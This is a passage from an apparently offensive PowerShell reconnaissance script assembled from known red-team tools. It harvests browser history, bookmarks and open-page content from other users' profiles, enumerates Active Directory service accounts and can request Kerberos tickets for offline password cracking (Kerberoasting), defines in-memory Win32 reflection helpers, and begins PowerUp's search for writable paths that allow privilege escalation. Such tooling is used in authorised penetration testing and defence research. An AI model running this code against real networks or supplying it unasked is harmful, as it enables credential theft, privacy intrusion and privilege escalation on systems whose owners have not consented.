            $User = ([System.Security.Principal.SecurityIdentifier] $Path.PSChildName).Translate( [System.Security.Principal.NTAccount]) | Select -ExpandProperty Value

            $Path = $Path | Select-Object -ExpandProperty PSPath

            $UserPath = "$Path\Software\Microsoft\Internet Explorer\TypedURLs"
            if (-not (Test-Path -Path $UserPath)) {
                Write-Verbose "[-] Could not find IE History for SID: $Path"
            }
            else {
                Get-Item -Path $UserPath -ErrorAction SilentlyContinue | ForEach-Object {
                    $Key = $_
                    $Key.GetValueNames() | ForEach-Object {
                        $Value = $Key.GetValue($_)
                        if ($Value -match $Search) {
                            New-Object -TypeName PSObject -Property @{
                                User = $UserName
                                Browser = 'IE'
                                DataType = 'History'
                                Data = $Value
                            }
                        }
                    }
                }
            }
        }
    }

    function Get-InternetExplorerBookmarks {
        $URLs = Get-ChildItem -Path "$Env:systemdrive\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
        ForEach ($URL in $URLs) {
            if ($URL.FullName -match 'Favorites') {
                $User = $URL.FullName.split('\')[2]
                Get-Content -Path $URL.FullName | ForEach-Object {
                    try {
                        if ($_.StartsWith('URL')) {
                            # parse the .url body to extract the actual bookmark location
                            $URL = $_.Substring($_.IndexOf('=') + 1)

                            if($URL -match $Search) {
                                New-Object -TypeName PSObject -Property @{
                                    User = $User
                                    Browser = 'IE'
                                    DataType = 'Bookmark'
                                    Data = $URL
                                }
                            }
                        }
                    }
                    catch {
                        Write-Verbose "Error parsing url: $_"
                    }
                }
            }
        }
    }

    function Get-FirefoxHistory {
        $Path = "$Env:systemdrive\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\"
        if (-not (Test-Path -Path $Path)) {
            Write-Verbose "[-] Could not find FireFox History for username: $UserName"
        }
        else {
            $Profiles = Get-ChildItem -Path "$Path\*.default\" -ErrorAction SilentlyContinue
            # Modified Regex to match SQLite DB
            $Regex = '(http|ftp|https|file)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?'
            $Value = Get-Content $Profiles\places.sqlite | Select-String -Pattern $Regex -AllMatches | Select-Object -ExpandProperty Matches |Sort -Unique
            $Value | ForEach-Object {
                    New-Object -TypeName PSObject -Property @{
                        User = $UserName
                        Browser = 'Firefox'
                        DataType = 'History'
                        Data = $_.Value
                        }    
                    }
        }
    }

    if (!$UserName) {
        $UserName = "$ENV:USERNAME"
    }

    if(($Browser -Contains 'All') -or ($Browser -Contains 'Chrome')) {
        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
            Get-ChromeHistory
        }
        if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
            Get-ChromeBookmarks
        }
    }

    if(($Browser -Contains 'All') -or ($Browser -Contains 'IE')) {
        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
            Get-InternetExplorerHistory
        }
        if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
            Get-InternetExplorerBookmarks
        }
    }

    if(($Browser -Contains 'All') -or ($Browser -Contains 'FireFox')) {
        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
            Get-FireFoxHistory
        }
    }
}

function Get-ActiveIEURLS {
<#
.SYNOPSIS

Returns a list of URLs currently loaded in the browser
Source: http://windowsitpro.com/powershell/retrieve-information-open-browsing-sessions
#>
    Param([switch]$Full, [switch]$Location, [switch]$Content)
    Write-Verbose "Enumerating active Internet Explorer windows"
    $urls = (New-Object -ComObject Shell.Application).Windows() |
    Where-Object {$_.LocationUrl -match "(^https?://.+)|(^ftp://)"} |
    Where-Object {$_.LocationUrl}
    if ($urls) {
        if($Full)
        {
            $urls
        }
        elseif($Location)
        {
            $urls | Select Location*
        }
        elseif($Content)
        {
            $urls | ForEach-Object {
                $_.LocationName;
                $_.LocationUrl;
                $_.Document.body.innerText
            }
        }
        else
        {
            $urls | Select-Object LocationUrl, LocationName
        }
    }
    else {
        Write-Verbose "[-] No active Internet Explorer windows found"
    }
}

# End Browser Enumeration

function Get-UserSPNS {
<#
  .SYNOPSIS

  # Edits by Tim Medin
  # File:     GetUserSPNS.ps1
  # Contents: Query the domain to find SPNs that use User accounts
  # Comments: This is for use with Kerberoast https://github.com/nidem/kerberoast
  #           The password hash used with Computer accounts are infeasible to 
  #           crack; however, if the User account associated with an SPN may have
  #           a crackable password. This tool will find those accounts. You do not
  #           need any special local or domain permissions to run this script. 
  #           This script on a script supplied by Microsoft (details below).
  # History:  2016/07/07     Tim Medin    Add -UniqueAccounts parameter to only get unique SAMAccountNames
#>
  [CmdletBinding()]
  Param(
    [Parameter(Mandatory=$False,Position=1)] [string]$GCName,
    [Parameter(Mandatory=$False)] [string]$Filter,
    [Parameter(Mandatory=$False)] [switch]$Request,
    [Parameter(Mandatory=$False)] [switch]$UniqueAccounts
  )
  Write-Verbose "Enumerating user SPNs for potential Kerberoast cracking..."
  Add-Type -AssemblyName System.IdentityModel

  $GCs = @()

  If ($GCName) {
    $GCs += $GCName
  } else { # find them
    $ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $CurrentGCs = $ForestInfo.FindAllGlobalCatalogs()
    ForEach ($GC in $CurrentGCs) {
      #$GCs += $GC.Name
      $GCs += $ForestInfo.ApplicationPartitions[0].SecurityReferenceDomain
    }
  }

  if (-not $GCs) {
    # no Global Catalogs Found
    Write-Output "`n[-] No Global Catalogs Found!"
    Return
  }

  ForEach ($GC in $GCs) {
      $searcher = New-Object System.DirectoryServices.DirectorySearcher
      $searcher.SearchRoot = "LDAP://" + $GC
      $searcher.PageSize = 1000
      $searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"
      $Null = $searcher.PropertiesToLoad.Add("serviceprincipalname")
      $Null = $searcher.PropertiesToLoad.Add("name")
      $Null = $searcher.PropertiesToLoad.Add("samaccountname")
      #$Null = $searcher.PropertiesToLoad.Add("userprincipalname")
      #$Null = $searcher.PropertiesToLoad.Add("displayname")
      $Null = $searcher.PropertiesToLoad.Add("memberof")
      $Null = $searcher.PropertiesToLoad.Add("pwdlastset")
      #$Null = $searcher.PropertiesToLoad.Add("distinguishedname")

      $searcher.SearchScope = "Subtree"

      $results = $searcher.FindAll()
      
      [System.Collections.ArrayList]$accounts = @()
          
      foreach ($result in $results) {
          foreach ($spn in $result.Properties["serviceprincipalname"]) {
              $o = Select-Object -InputObject $result -Property `
                  @{Name="ServicePrincipalName"; Expression={$spn.ToString()} }, `
                  @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
                  #@{Name="UserPrincipalName";   Expression={$result.Properties["userprincipalname"][0].ToString()} }, `
                  @{Name="SAMAccountName";       Expression={$result.Properties["samaccountname"][0].ToString()} }, `
                  #@{Name="DisplayName";         Expression={$result.Properties["displayname"][0].ToString()} }, `
                  @{Name="MemberOf";             Expression={$result.Properties["memberof"][0].ToString()} }, `
                  @{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} } #, `
                  #@{Name="DistinguishedName";   Expression={$result.Properties["distinguishedname"][0].ToString()} }
              if ($UniqueAccounts) {
                  if (-not $accounts.Contains($result.Properties["samaccountname"][0].ToString())) {
                      $Null = $accounts.Add($result.Properties["samaccountname"][0].ToString())
                      $o
                      if ($Request) {
                          $Null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString()
                      }
                  }
              } else {
                  $o
                  if ($Request) {
                      $Null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString()
                  }
              }
          }
      }
  }
}

###########
# PowerUp
###########

<#
    Modified version of PowerUp (authored by @harmj0y) without the modification functions
    
    PowerUp aims to be a clearinghouse of common Windows privilege escalation
    vectors that rely on misconfigurations. See README.md for more information.

    Author: @harmj0y
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
    Link: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
#>

#Requires -Version 2


########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule
{
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory=$True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 'func' helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER EntryPoint

The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

.NOTES

Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


########################################################
#
# PowerUp Helpers
#
########################################################

function Get-ModifiablePath {
<#
    .SYNOPSIS

        Parses a passed string containing multiple possible file/folder paths and returns
        the file paths where the current user has modification rights.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        Takes a complex path specification of an initial file/folder path with possible
        configuration files, 'tokenizes' the string in a number of possible ways, and
        enumerates the ACLs for each path that currently exists on the system. Any path that
        the current user has modification rights on is returned in a custom object that contains
        the modifiable path, associated permission set, and the IdentityReference with the specified
        rights. The SID of the current user and any group he/she are a part of are used as the
        comparison set against the parsed path DACLs.

    .PARAMETER Path

        The string path to parse for modifiable files. Required

    .PARAMETER LiteralPaths

        Switch. Treat all paths as literal (i.e. don't do 'tokenization').

    .EXAMPLE

        PS C:\> '"C:\Temp\blah.exe" -f "C:\Temp\config.ini"' | Get-ModifiablePath

        Path                       Permissions                IdentityReference
        ----                       -----------                -----------------
        C:\Temp\blah.exe           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
        C:\Temp\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...

    .EXAMPLE

        PS C:\> Get-ChildItem C:\Vuln\ -Recurse | Get-ModifiablePath

        Path                       Permissions                IdentityReference
        ----                       -----------                -----------------
        C:\Vuln\blah.bat           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
        C:\Vuln\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
        ...
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Switch]
        $LiteralPaths
    )

    BEGIN {
        # # false positives ?
        # $Excludes = @("MsMpEng.exe", "NisSrv.exe")

        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value

        $TranslatedIdentityReferences = @{}
    }

    PROCESS {

        ForEach($TargetPath in $Path) {

            $CandidatePaths = @()

            # possible separator character combinations
            $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")

            if($PSBoundParameters['LiteralPaths']) {

                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))

                if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                }
                else {
                    # if the path doesn't exist, check if the parent folder allows for modification
                    try {
